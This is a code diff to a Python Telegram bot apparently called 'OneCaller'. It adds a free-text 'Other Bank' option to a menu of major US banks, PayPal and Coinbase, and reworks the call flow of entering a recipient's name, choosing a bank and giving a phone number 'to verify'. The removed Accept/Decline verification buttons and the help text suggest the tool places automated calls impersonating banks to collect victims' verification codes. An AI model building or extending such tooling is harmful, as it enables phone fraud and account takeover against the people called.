@@ -4,11 +4,11 @@ import telebot
 class CallUtils:
     def __init__(self):
         self.BANK_OPTIONS = [
-    "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
-    "Morgan Stanley", "KeyBank", "Bank of America", "U.S. Bank", "Truist",
-    "BMO Harris", "Fifth Third Bank", "Huntington", "Ally Bank", "Wells Fargo",
-    "PNC Bank", "Capital One", "First Citizens", "M&T Bank", "American Express", "Paypal", "Coinbase"
-]
+            "JPMorgan Chase", "Citibank", "Goldman Sachs", "TD Bank", "Citizens Bank",
+            "Morgan Stanley", "KeyBank", "Bank of America", "U.S. Bank", "Truist",
+            "BMO Harris", "Fifth Third Bank", "Huntington", "Ally Bank", "Wells Fargo",
+            "PNC Bank", "Capital One", "First Citizens", "M&T Bank", "American Express", "Paypal", "Coinbase"
+        ]
         self.BANKS_PER_PAGE = 5
         self.status_emojis = {
             'queued': '⏳', 'ringing': '🔔', 'in-progress': '📞',
@@ -20,6 +20,9 @@ class CallUtils:
         markup = telebot.types.InlineKeyboardMarkup(row_width=2)
         start_index = page * self.BANKS_PER_PAGE
         end_index = start_index + self.BANKS_PER_PAGE
+
+        # Add custom bank button at the top
+        markup.add(telebot.types.InlineKeyboardButton("➕ Other Bank", callback_data="custom_bank"))
 
         banks_page = self.BANK_OPTIONS[start_index:end_index]
         for bank in banks_page:
@@ -35,22 +38,22 @@ class CallUtils:
             markup.row(*nav_buttons)
         return markup
 
-    def create_verification_keyboard(self, call_sid):
-        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            telebot.types.InlineKeyboardButton("✅ Accept", callback_data=f"verify_accept_{call_sid}"),
-            telebot.types.InlineKeyboardButton("❌ Decline", callback_data=f"verify_decline_{call_sid}"),
-            telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}")
-        )
-        return markup
-
-    def create_hangup_keyboard(self, call_sid):
-        markup = telebot.types.InlineKeyboardMarkup()
-        markup.add(telebot.types.InlineKeyboardButton("⏹️ Hangup", callback_data=f"hangup_{call_sid}"))
-        return markup
-
     def handle_bank_selection(self, call, bot, user_states):
         chat_id = call.message.chat.id
+        
+        if call.data == "custom_bank":
+            bot.answer_callback_query(call.id)
+            if isinstance(user_states.get(chat_id), dict):
+                user_states[chat_id]["state"] = "awaiting_custom_bank"
+            else:
+                user_states[chat_id] = {"state": "awaiting_custom_bank"}
+            
+            bot.send_message(
+                chat_id,
+                "📝 Please enter the name of the bank:"
+            )
+            return
+
         if call.data.startswith("bank_"):
             bank_name = call.data[5:]
             bot.answer_callback_query(call.id, text=f"Selected: {bank_name}")
@@ -74,22 +77,22 @@ class CallUtils:
                 reply_markup=self.create_bank_keyboard(page)
             )
 
-    def handle_utility_callbacks(self, call, bot):
-        chat_id = call.message.chat.id
-        if call.data == "help":
-            bot.answer_callback_query(call.id)
-            help_text = (
-                "📌 *OneCaller Guide*\n\n"
-                "1️⃣ Click 'Start Call'\n"
-                "2️⃣ Enter recipient's name\n"
-                "3️⃣ Select the specific bank\n"
-                "4️⃣ Enter phone number with country code\n"
-                "📞 *Call Status Icons:*\n"
-                "🔔 Ringing\n"
-                "📞 In Progress\n"
-                "✅ Completed\n"
-                "❌ Failed\n"
-                "⏰ Busy\n"
-                "📵 No Answer\n\n"
+    def handle_message(self, message, bot, user_states):
+        chat_id = message.chat.id
+        user_state = user_states.get(chat_id, {}).get("state")
+        
+        if user_state == "awaiting_custom_bank":
+            custom_bank = message.text.strip()
+            user_states[chat_id] = {
+                "state": "awaiting_phone",
+                "bank": custom_bank
+            }
+            bot.send_message(
+                chat_id,
+                f"Selected bank: {custom_bank}\n\n"
+                "📱 Enter the phone number to verify:\n"
+                "Format: +[country_code][number]\n"
+                "Example: +15017122661"
             )
-            bot.send_message(chat_id, help_text, parse_mode="Markdown")
+            return True
+        return False
